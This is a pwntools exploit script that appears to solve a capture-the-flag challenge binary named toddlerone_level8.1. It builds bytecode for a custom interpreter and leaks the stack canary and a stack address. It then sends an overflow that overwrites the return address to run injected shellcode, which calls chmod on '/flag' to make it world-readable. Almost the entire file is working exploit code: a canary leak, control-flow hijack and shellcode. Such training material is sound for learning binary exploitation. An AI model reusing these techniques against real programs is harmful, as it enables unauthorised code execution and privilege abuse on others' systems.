from pwn import *
from pyrsistent import b 
context.arch='amd64'
reg = {'a': b'\x04' , 'b':b'\x01' , 'c':b'\x10', 'd':b'\x40', 's':b'\x20', 'i':b'\x02', 'f':b'\x08'}
ins = {'sys': b'\x80', 'imm' : b'\x20'}
systable = {'crash':b'\x10','read':b'\x20','read_300' : b'\x02' , 'write' :b'\x04'}
def imm(regNo, imm):
    a = {'1' : int.to_bytes(imm,1,'little') , '2' : reg[regNo] , '3' : ins['imm']}
    return  a['2'] + a['3'] + a['1']

def read_300(fd,offset,count,ret_regNo):
    a = {'1' : systable['read_300'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload + a['1'] + a['3'] + a['2']

    return payload 

def read_0(fd,offset,count,ret_regNo):
    a = {'1' : systable['read'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload + a['1'] + a['3'] + a['2']

    return payload 

def write_300(fd,offset,count,ret_regNo):
    a = {'1' : systable['write'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload + a['1'] + a['3'] + a['2']

    return payload 

def exit(v):
    payload = b''
    payload += imm('a',v)
    payload += b'\x01\x08\x00'

    return payload

r = process('/challenge/toddlerone_level8.1')

payload2=asm('''
    push 90
    pop rax
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''')


payload = b''

payload += write_300(1,0xff,0xff,'d')
payload += read_300(0,0xff,0xff,'d')
payload += imm('i',0xff)
r.send(payload)

r.recvuntil(b'Starting interpreter loop! Good luck!\n')
r.recv(0x9)
### ret
canary = u64(r.recv(8))
print(hex(canary))
r.recv(0x18)
## stack
stack = u64(r.recv(8)) - 232
print(hex(stack))

r.send(b'\x00' + b'\x01'*5 + b'\xff' + b'\x01'*2 + p64(canary) + b'\x00'*0x8 + p64(stack) + payload2)


r.interactive()